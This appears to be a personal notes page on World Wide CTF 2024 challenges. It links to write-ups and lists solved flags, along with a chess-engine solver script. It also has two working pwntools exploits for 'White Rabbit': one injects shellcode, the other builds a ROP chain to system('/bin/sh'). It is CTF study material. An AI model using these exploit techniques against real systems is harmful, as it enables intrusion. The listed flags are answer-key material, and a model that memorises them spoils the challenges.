#### Resources
##### Links
- [Challenges](https://wwctf.com/challenges)
- [Discord Server](https://discord.com/channels/1307680160581156915/1312748679018582096)
- Write-ups
	- [Official write-ups](https://yun.ng/c/ctf/2024-wwctf) (by yun)

https://blog.regularofvanilla.com/posts/wannagame


Choose to write:
- Simpler RSA (50)
	- https://yun.ng/c/ctf/2024-wwctf/crypto/simpler-rsa
	- wwf{ju57_u53_l1br4r135}
- Secure Shell (50) - no flag
- White Rabbit (95) - no flag 
- All your base belong to us (65)
	- wwf{cyb3rch3f_d0esnt_h4v3_4ll_th3_4nsw3rs_4wg0432f}
- World Wide Flags (150)
	- wwf{d1d_y0u_u53_41_70_r34d_fl465}
	- the flag-guessing thing... just say got flag by manually answering
	- Intended solution was to implement AI



Misc: All your base belong to us
https://ahmed-naser.medium.com/world-wide-ctf-2024-forensics-challenges-f6cdfc8b017c
- simple decrypting
wwf{cyb3rch3f_d0esnt_h4v3_4ll_th3_4nsw3rs_4wg0432f}

Rust containment (274)
- has attached program
- panic!(include_str!(file!()))

Free my man pascal (476)
- !! only 8 solves (sus if write...)
- use-after-free (heap)
wwf{P4sc4l_U4f_FTW_174a3f4fa44c7bb22b}


Just lattice (brute-force)
- code on VS code



Bongcloud (153)
- no program attached with chal
```python
# Bongcloud 153

# Total solves: 95

  

from pwn import *

import chess

import chess.engine

import re

  

r = remote('chess.chal.wwctf.com', 1337)

  

r.sendline(b'\n')

r.clean()

  
  

engine_path = "./stockfish/stockfish-ubuntu-x86-64"

  

with chess.engine.SimpleEngine.popen_uci(engine_path) as engine:

while True:

fen = None

while fen is None:

line = r.recvline().strip().decode()

  

if "-" in line: # high quality FEN detection

fen = line

log.info(f"Received valid FEN: {fen}")

if "play again!" in line: # game has been won

r.sendline(b'\n')

continue

log.info(line)

  

board = chess.Board(fen)

  

result = engine.play(board, chess.engine.Limit(time=2.0))

best_move = result.move

  

log.info(f"Best move: {best_move}")

  

r.sendline(str(best_move).encode())
```


Secure Shell (50)
- echo $(/readflag)
- ls && /readflag works too

White Rabbit (95)
```python
# Solver's Script 1
from pwn import * 
shell = remote("whiterabbit.chal.wwctf.com", 1337) 
#shell = gdb.debug("./white_rabbit", "continue") 
#shell = process("./white_rabbit") shell.recvuntil(b"> ") 
binary_base = int(shell.recvline().strip(), 16) - 0x1180 
shellcode = asm(""" 
				push 0x3b # execve() 
				pop rax # $rax = execve() 
				mov rdi, 0x68732f6e69622f # $rdi = "/bin/sh" 
				push rdi # $rsp = &"/bin/sh" 
				push rsp # &"/bin/sh" 
				pop rdi # $rdi = &"/bin/sh" 
				cdq # $rdx = NULL 
				push rdx # $rsp = &0x0 
				pop rsi # $rsi = NULL 
				syscall # system call 
				""", arch="amd64") 
offset = 120 
junk = b"A" * (offset - len(shellcode)) 
payload = b"" 
payload += shellcode 
payload += junk 
payload += p64(binary_base + 0x1014) # call rax;
shell.sendlineafter(b"...\n", payload) 
shell.interactive()
```

```python
# Solver's Script 2
# Techniques: ROP chain, buffer overflow
from pwn import *

program_name = "./white_rabbit"

CRASH = 0x41414141

#p = process(program_name)
#p = remote("whiterabbit.chal.wwctf.com", 1337)

p = gdb.debug(program_name, gdbscript="", api=True)
p.gdb.Breakpoint("follow", temporary=False)
p.gdb.continue_nowait()

p.recvuntil("> ")

MAIN = int(p.recvuntil("\n")[:-1],16)
PRINTF = MAIN + 134

p.sendline(
        b"A"*8*15 +
        p64(PRINTF))

p.recvuntil("> ")
someaddr = p.recvuntil("\n")
print(f"[+] someaddr = {someaddr}")
LIBC_BASE = int(someaddr[:-1],16) - 0x1d6963

print(f"[+] LIBC_BASE = {hex(LIBC_BASE)}")

LIBC_POP_RDI = LIBC_BASE + 0x0000000000028215
LIBC_SYSTEM = LIBC_BASE + 0x000000000004dab0
LIBC_BINSH_STRING = LIBC_BASE + 0x197e34
LIBC_RET = LIBC_BASE + 0x000000000002668c

p.sendline(
        b"A"*8*15 +
        p64(LIBC_RET) +
        p64(LIBC_POP_RDI) +
        p64(LIBC_BINSH_STRING) +
        p64(LIBC_SYSTEM) +
        p64(CRASH))

p.interactive()
```